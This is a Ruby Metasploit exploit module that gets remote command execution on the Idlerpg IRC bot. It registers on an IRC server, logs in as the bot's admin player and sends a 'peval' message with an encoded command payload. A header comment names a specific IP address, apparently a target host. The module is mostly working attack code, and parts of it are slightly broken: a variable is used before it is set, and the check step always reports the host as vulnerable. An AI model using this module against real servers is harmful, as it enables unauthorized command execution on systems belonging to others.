##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Juiblex runs on 144.76.141.196
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
                          'Name'           => 'Idlerpg IRC Bot Remote Code Execution',
                          'Description'    => %q{
          This module allows remote command execution on the Idlerpg IRC Bot.
                          },
                              'Author'         =>
                          [
                              'Doug Prostko'
                          ],
                          'License'        => MSF_LICENSE,
                          'References'     =>
                          [
                              [ 'OSVDB', '' ],
                              [ 'EDB', '' ]
                          ],
                          'Platform'       => %w{ unix linux },
                          'Arch'           => ARCH_CMD,
                          'Payload'        =>
                          {
                              'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf
                              #'BadChars' => '"\x00\xff\xa',
                              'DisableNops' => true,
                              'Compat'      =>
                              {
                                  'PayloadType' => 'cmd'
                              }
                          },
                          'Targets'  =>
                          [
                              [ 'idlerpg', { } ]
                          ],
                          'Privileged'     => false,
                          'DisclosureDate' => 'June 1 2018',
                          'DefaultTarget'  => 0))

        register_options(
            [
                Opt::RPORT(6667),
                #OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),
                #OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),
                OptString.new('CHANNEL', [true, 'IRC Channel', '#channel']),
                OptString.new('BOTNICK', [true, 'Idlerpg bot nick', '']),
                OptString.new('ADMIN_PLAYER', [true, 'Admin player name', '']),
                OptString.new('ADMIN_PASS', [true, 'Admin player pass', ''])
            ])
    end

    # check to see if admin player is logged in or not.
    def check
        connect

        register(sock)
        if res =~ /463/ || res =~ /464/
            vprint_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return Exploit::CheckCode::Unknown
        end
=begin

        res = join(sock)
        if !res =~ /353/ && !res =~ /366/
            vprint_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
            return Exploit::CheckCode::Unknown
        end

        quit(sock)
        disconnect

        if res =~ /auth/ && res =~ /logged in/
            Exploit::CheckCode::Vulnerable
        else
            Exploit::CheckCode::Safe
        end
=end
        join(sock)
        login_as_admin_player(sock)
        quit(sock)
        disconnect
        Exploit::CheckCode::Vulnerable
    end

    def send_msg(sock, data)
        sock.put(data)
        data = ""
        begin
            read_data = sock.get_once(-1, 1)
            while !read_data.nil?
                data << read_data
                read_data = sock.get_once(-1, 1)
            end
        rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e
            elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        end

        data
    end

    def register(sock)
        msg = ""
        nick = rand_text_alpha(9)
        msg << "NICK #{nick}\r\n"
        msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"
        res = send_msg(sock,msg)
        sleep 1
        return res
    end

    def join(sock)
        join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
        res = send_msg(sock, join_msg)
        sleep 1
        return res
    end

    def login_as_admin_player(sock)
        msg = ""
        msg << "PRIVMSG #{datastore['BOTNICK']} :login #{datastore['ADMIN_PLAYER']} #{datastore['ADMIN_PASS']}\r\n"
        res = send_msg(sock, msg)
        return res
    end

    def idlerpg_command(sock)
        encoded = payload.encoded
        command_msg = "PRIVMSG #{datastore['BOTNICK']} :peval \`#{encoded}\`\r\n"
        res = send_msg(sock, command_msg)
        return res
    end

    def quit(sock)
        quit_msg = "QUIT :bye bye\r\n"
        sock.put(quit_msg)
    end

    def exploit
        connect

        print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
        res = register(sock)
        if res =~ /463/ || res =~ /464/
            print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
            return
        end

        print_status("#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...")
        join(sock)
        if !res =~ /353/ && !res =~ /366/
            print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
            return
        end

        print_status("#{rhost}:#{rport} - Logging in as admin player")
        login_as_admin_player(sock)

        print_status("#{rhost}:#{rport} - Exploiting the IRC bot...")
        idlerpg_command(sock)

        quit(sock)
        disconnect
    end
end
